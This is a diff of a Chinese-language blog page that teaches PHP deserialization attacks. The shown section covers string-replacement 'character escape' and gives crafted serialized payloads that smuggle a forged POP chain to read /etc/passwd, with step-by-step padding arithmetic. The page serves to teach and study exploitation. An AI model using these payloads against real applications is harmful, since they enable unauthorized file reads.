class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure></div>
-
 <p>分析代码发现我们构造这样一个 POP 链就可以实现任意文件读：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">B Object</span><br><span class="line">(</span><br><span class="line">    [b] =&gt; C Object</span><br><span class="line">        (</span><br><span class="line">            [c] =&gt; /etc/passwd</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
-
-<p>我们只能控制序列化数据中 <code>A</code> 的两个属性的值，但是在反序列化前序列化数据会经历  <code>write</code> 和 <code>read</code> 两个函数：</p>
+<p>我们只能控制序列化数据中 <code>A</code>
+的两个属性的值，但是在反序列化前序列化数据会经历 <code>write</code> 和
+<code>read</code> 两个函数：</p>
 <ul>
-<li><code>write</code>：<code>chr(0) . &#39;*&#39; . chr(0)</code>（长度 3）→ <code>\0\0\0</code>（长度 6）</li>
-<li><code>read</code>：<code>\0\0\0</code>（长度 6）→ <code>chr(0) . &#39;*&#39; . chr(0)</code>（长度 3）</li>
+<li><code>write</code>：<code>chr(0) . '*' . chr(0)</code>（长度 3）→
+<code>\0\0\0</code>（长度 6）</li>
+<li><code>read</code>：<code>\0\0\0</code>（长度 6）→
+<code>chr(0) . '*' . chr(0)</code>（长度 3）</li>
 </ul>
-<p>由于替换不等长，因此我们可以在序列化数据中可控的字符串部分添加 <code>\0\0\0</code> 使得完成替换后字符串长度变短，但序列化数据中藐视字符串长度的字段没有改变，导致 PHP 反序列化的时候发生类型混淆。</p>
-<p>我们可以构造如下序列化数据，其中橙色和紫色部分分别是 <code>$_GET[&#39;a&#39;]</code> 和 <code>$_GET[&#39;b&#39;]</code> 。</p>
-<div style=""><pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#080808">O:1:"A":2:{s:8:"username";s:48:"</font><font color="#ff8000">\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</font><font color="#080808">";s:8:"password";s:89:"</font><font color="#7f00ff">a";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}s:0:"";s:0:"</font><font color="#080808">";}</font><span style="color: rgb(8, 8, 8); background-color: rgb(255, 255, 255);">
-</span></pre></div>
-
-
-<p>经过 <code>write</code> 和 <code>read</code> 替换后，序列化数据变成下面这种形式，其中 <code>username</code>（橙色部分）字符串长度缩短，但是标记的长度仍是 48，因此会将后续部分识别为字符串。这样就可以将我们在 <code>password</code> 中伪造的 <code>password</code> 键值对（蓝色和红色）解析。</p>
-<div style=""><pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#080808">O:1:"A":2:{s:8:"username";s:</font>48<font color="#080808">:"</font><font color="#ff8000">0*00*00*00*00*00*00*00*0";s:8:"password";s:89:"a</font><font color="#080808">";</font><font color="#0000ff">s:8:"password";</font><font color="#ff0000">O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}</font><font color="#009900">s:0:"";s:0:"</font><font color="#080808">";}</font></pre></div>
-
-
+<p>由于替换不等长，因此我们可以在序列化数据中可控的字符串部分添加
+<code>\0\0\0</code>
+使得完成替换后字符串长度变短，但序列化数据中藐视字符串长度的字段没有改变，导致
+PHP 反序列化的时候发生类型混淆。</p>
+<p>我们可以构造如下序列化数据，其中橙色和紫色部分分别是
+<code>$_GET['a']</code> 和 <code>$_GET['b']</code> 。</p>
+<div style="">
+<pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#080808">O:1:"A":2:{s:8:"username";s:48:"</font><font color="#ff8000">\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</font><font color="#080808">";s:8:"password";s:89:"</font><font color="#7f00ff">a";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}s:0:"";s:0:"</font><font color="#080808">";}</font><span style="color: rgb(8, 8, 8); background-color: rgb(255, 255, 255);">
+</span></pre>
+</div>
+<p>经过 <code>write</code> 和 <code>read</code>
+替换后，序列化数据变成下面这种形式，其中
+<code>username</code>（橙色部分）字符串长度缩短，但是标记的长度仍是
+48，因此会将后续部分识别为字符串。这样就可以将我们在
+<code>password</code> 中伪造的 <code>password</code>
+键值对（蓝色和红色）解析。</p>
+<div style="">
+<pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#080808">O:1:"A":2:{s:8:"username";s:</font>48<font color="#080808">:"</font><font color="#ff8000">0*00*00*00*00*00*00*00*0";s:8:"password";s:89:"a</font><font color="#080808">";</font><font color="#0000ff">s:8:"password";</font><font color="#ff0000">O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}</font><font color="#009900">s:0:"";s:0:"</font><font color="#080808">";}</font></pre>
+</div>
 <p>这里解释一下输入构造：</p>
-<div style=""><pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#ff8000">a";</font><font color="#0000ff">s:8:"password";</font><font color="#ff0000">O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}</font><font color="#009900">s:0:"";s:0:"</font></pre></div>
-
+<div style="">
+<pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#ff8000">a";</font><font color="#0000ff">s:8:"password";</font><font color="#ff0000">O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}</font><font color="#009900">s:0:"";s:0:"</font></pre>
+</div>
 <ul>
-<li><code>a&quot;;</code>：因为每替换一次字符串缩短 3 字节，而我们要把 <code>&quot;;s:8:&quot;password&quot;;s:89:</code> 覆盖，但是这段字符串长度为 22，不能被 3 整除，因此后面需要填充字符。这里要注意不能在 <code>$_GET[&#39;a&#39;]</code> 填充字符，因为这样会算到 <code>username</code> 中。而在 <code>$_GET[&#39;b&#39;]</code> 填充字符会多一个 <code>&quot;</code> 因此只需填充一个字符 <code>a</code> 就可以保证被覆盖的字符串长度为 24，刚好被 3 整除。另外后面还要添加一个 <code>&quot;</code> 确保闭合。</li>
-<li><code>s:0:&quot;&quot;;s:0:&quot;</code>：<code>password</code> 字段的值的右边的 <code>&quot;</code> 需要被闭合，但是伪造的 <code>password</code> 是一个对象的序列化结果，不以 <code>&quot;</code> 闭合，因此需要再构造一个字符串属性值 <code>s:0:&quot;&quot;;s:0:&quot;</code> 来闭合（其实直接闭合也是可以的，后面的无效字符会被省略）。</li>
+<li><code>a";</code>：因为每替换一次字符串缩短 3 字节，而我们要把
+<code>";s:8:"password";s:89:</code> 覆盖，但是这段字符串长度为
+22，不能被 3 整除，因此后面需要填充字符。这里要注意不能在
+<code>$_GET['a']</code> 填充字符，因为这样会算到 <code>username</code>
+中。而在 <code>$_GET['b']</code> 填充字符会多一个 <code>"</code>
+因此只需填充一个字符 <code>a</code> 就可以保证被覆盖的字符串长度为
+24，刚好被 3 整除。另外后面还要添加一个 <code>"</code> 确保闭合。</li>
+<li><code>s:0:"";s:0:"</code>：<code>password</code> 字段的值的右边的
+<code>"</code> 需要被闭合，但是伪造的 <code>password</code>
+是一个对象的序列化结果，不以 <code>"</code>
+闭合，因此需要再构造一个字符串属性值 <code>s:0:"";s:0:"</code>
+来闭合（其实直接闭合也是可以的，后面的无效字符会被省略）。</li>
 </ul>
-<h2 id="短到长的替换"><a href="#短到长的替换" class="headerlink" title="短到长的替换"></a>短到长的替换</h2><p>在上一个示例的基础上我们把 <code>read</code> 和 <code>write</code> 函数调换顺序。此时我们只要输入包含 <code>chr(0) . &#39;*&#39; . chr(0)</code> 子串的字符串就可以将序列化字符串增长。</p>
+<h2 id="短到长的替换">短到长的替换</h2>
+<p>在上一个示例的基础上我们把 <code>read</code> 和 <code>write</code>
+函数调换顺序。此时我们只要输入包含 <code>chr(0) . '*' . chr(0)</code>
+子串的字符串就可以将序列化字符串增长。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure></div>
-
 <p>短到长的替换只需要控制一个字段就可以实现字符逃逸，因为我们只需要在字符串前面填充适当数量的可替换字符，就可以把我们伪造的序列化字符串逃逸到字符串外面。</p>
 <p>例如我们可以构造如下的序列化字符串，其中橙色和蓝色部分是我们的输入：</p>
-<div style=""><pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#080808">O:1:"A":2:{s:8:"username";s:162:"</font><font color="#ff8000">0*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*0";s:1:"a";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}s:0:"";s:0:"</font><font color="#080808">";s:8:"password";s:3:"</font><font color="#7f00ff">aaa</font><font color="#080808">";}</font></pre></div>
-
-<p>经过 <code>read</code> 和 <code>write</code> 替换后，序列化数据变成下面这种形式：</p>
-<div style=""><pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#080808">O:1:"A":2:{s:8:"username";s:162:"</font><font color="#ff8000">\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</font><font color="#080808">";</font><font color="#0000ff">s:1:"a";</font><font color="#ff0000">O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}</font><font color="#009900">s:0:"";s:0:"</font><font color="#080808">";s:8:"password";s:3:"aaa";}</font><span style="color: rgb(8, 8, 8); background-color: rgb(255, 255, 255);">
-</span></pre></div>
-
-
+<div style="">
+<pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#080808">O:1:"A":2:{s:8:"username";s:162:"</font><font color="#ff8000">0*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*00*0";s:1:"a";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}s:0:"";s:0:"</font><font color="#080808">";s:8:"password";s:3:"</font><font color="#7f00ff">aaa</font><font color="#080808">";}</font></pre>
+</div>
+<p>经过 <code>read</code> 和 <code>write</code>
+替换后，序列化数据变成下面这种形式：</p>
+<div style="">
+<pre style="font-family: &quot;JetBrains Mono&quot;, monospace; font-size: 9.8pt;"><font color="#080808">O:1:"A":2:{s:8:"username";s:162:"</font><font color="#ff8000">\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</font><font color="#080808">";</font><font color="#0000ff">s:1:"a";</font><font color="#ff0000">O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:11:"/etc/passwd";}}</font><font color="#009900">s:0:"";s:0:"</font><font color="#080808">";s:8:"password";s:3:"aaa";}</font><span style="color: rgb(8, 8, 8); background-color: rgb(255, 255, 255);">
+</span></pre>
+</div>
 <p>这里要注意，其实我们完成字符逃逸之后整个序列化字符串中类的属性数量和实际属性数量是对不上的，因此会在反序列化的过程中提前析构，因此最好选择靠前的可控字段进行逃逸。</p>
 
         </div>
@@ -1004,7 +1185,12 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">PHP 反序列化</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F"><span class="nav-text">PHP 序列化格式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-text">基本数据类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Null"><span class="nav-text">Null</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E5%80%BC%EF%BC%88Boolean%EF%BC%89"><span class="nav-text">布尔值（Boolean）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%EF%BC%88Integer%EF%BC%89"><span class="nav-text">整数（Integer）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%AE%E7%82%B9%E6%95%B0%EF%BC%88Double%EF%BC%89"><span class="nav-text">浮点数（Double）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88String%EF%BC%89"><span class="nav-text">字符串（String）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E6%9D%82%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-text">复杂数据类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%EF%BC%88Array%EF%BC%89"><span class="nav-text">数组（Array）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B4%A2%E5%BC%95%E6%95%B0%E7%BB%84"><span class="nav-text">索引数组</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84"><span class="nav-text">关联数组</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%EF%BC%88Object%EF%BC%89"><span class="nav-text">对象（Object）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%AC%E6%9C%89%E5%B1%9E%E6%80%A7%EF%BC%88Public-Properties%EF%BC%89"><span class="nav-text">公有属性（Public Properties）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%97%E4%BF%9D%E6%8A%A4%E5%B1%9E%E6%80%A7%EF%BC%88Protected-Properties%EF%BC%89"><span class="nav-text">受保护属性（Protected Properties）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7%EF%BC%88Private-Properties%EF%BC%89"><span class="nav-text">私有属性（Private Properties）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B5%8C%E5%A5%97%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B"><span class="nav-text">嵌套复合类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8"><span class="nav-text">对象引用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8"><span class="nav-text">指针引用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6"><span class="nav-text">引用处理机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">自定义对象序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-sleep-%E5%92%8C-wakeup-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">使用 __sleep 和 __wakeup 自定义序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-Serializable-%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">使用  Serializable 接口自定义序列化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">PHP 魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%9B%B8%E5%85%B3"><span class="nav-text">生命周期相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#construct"><span class="nav-text">__construct()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#destruct"><span class="nav-text">__destruct()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3"><span class="nav-text">序列化相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#wakeup"><span class="nav-text">__wakeup()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep"><span class="nav-text">__sleep()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E7%9B%B8%E5%85%B3"><span class="nav-text">类型转换相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#toString-NaN"><span class="nav-text">__toString()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#invoke"><span class="nav-text">__invoke()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%90%E5%91%98%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3"><span class="nav-text">成员访问相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#get"><span class="nav-text">__get()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#set"><span class="nav-text">__set()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isset"><span class="nav-text">__isset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unset"><span class="nav-text">__unset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call"><span class="nav-text">__call()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callStatic"><span class="nav-text">__callStatic()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E7%9B%B8%E5%85%B3"><span class="nav-text">回调函数相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func%E3%80%81call-user-func-array"><span class="nav-text">call_user_func、call_user_func_array</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8"><span class="nav-text">应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%B7%E7%82%B9"><span class="nav-text">起点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E8%B7%B3%E6%9D%BF"><span class="nav-text">中间跳板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%88%E7%82%B9"><span class="nav-text">终点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-text">其他</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8"><span class="nav-text">反序列化基础利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#POP-%E9%93%BE"><span class="nav-text">POP 链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"><span class="nav-text">生成序列化数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%B5%8B%E5%80%BC"><span class="nav-text">属性赋值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="nav-text">PHP 反序列化绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wakeup-%E7%BB%95%E8%BF%87"><span class="nav-text">__wakeup 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Fast-Destruct-%E7%BB%95%E8%BF%87"><span class="nav-text">Fast Destruct 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2016-7124"><span class="nav-text">CVE-2016-7124</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#custom-object-%E7%BB%95%E8%BF%87"><span class="nav-text">custom object 绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-text">过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%B1%9E%E6%80%A7%E7%BB%95%E8%BF%87"><span class="nav-text">类属性绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text">数字绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unicode-%E7%BB%95%E8%BF%87"><span class="nav-text">Unicode 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="nav-text">二次序列化绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%AF%B9%E8%B1%A1%E7%BB%95%E8%BF%87"><span class="nav-text">无对象绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="nav-text">反序列化字符逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%95%BF%E5%88%B0%E7%9F%AD%E6%9B%BF%E6%8D%A2"><span class="nav-text">长到短替换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%AD%E5%88%B0%E9%95%BF%E7%9A%84%E6%9B%BF%E6%8D%A2"><span class="nav-text">短到长的替换</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php-%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F"><span class="nav-text">PHP 序列化格式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-text">基本数据类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-text">Null</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E5%80%BCboolean"><span class="nav-text">布尔值（Boolean）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B4%E6%95%B0integer"><span class="nav-text">整数（Integer）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%AE%E7%82%B9%E6%95%B0double"><span class="nav-text">浮点数（Double）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2string"><span class="nav-text">字符串（String）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E6%9D%82%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-text">复杂数据类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84array"><span class="nav-text">数组（Array）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B4%A2%E5%BC%95%E6%95%B0%E7%BB%84"><span class="nav-text">索引数组</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84"><span class="nav-text">关联数组</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1object"><span class="nav-text">对象（Object）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%AC%E6%9C%89%E5%B1%9E%E6%80%A7public-properties"><span class="nav-text">公有属性（Public
+Properties）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%97%E4%BF%9D%E6%8A%A4%E5%B1%9E%E6%80%A7protected-properties"><span class="nav-text">受保护属性（Protected
+Properties）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7private-properties"><span class="nav-text">私有属性（Private
+Properties）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B5%8C%E5%A5%97%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B"><span class="nav-text">嵌套复合类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8"><span class="nav-text">对象引用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8"><span class="nav-text">指针引用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6"><span class="nav-text">引用处理机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">自定义对象序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-__sleep-%E5%92%8C-__wakeup-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">使用 __sleep 和 __wakeup
+自定义序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-serializable-%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">使用 Serializable
+接口自定义序列化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">PHP 魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%9B%B8%E5%85%B3"><span class="nav-text">生命周期相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#construct"><span class="nav-text">__construct()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#destruct"><span class="nav-text">__destruct()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3"><span class="nav-text">序列化相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#wakeup"><span class="nav-text">__wakeup()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep"><span class="nav-text">__sleep()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E7%9B%B8%E5%85%B3"><span class="nav-text">类型转换相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tostring"><span class="nav-text">__toString()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#invoke"><span class="nav-text">__invoke()</span></a></li></ol></li><li class="nav-item 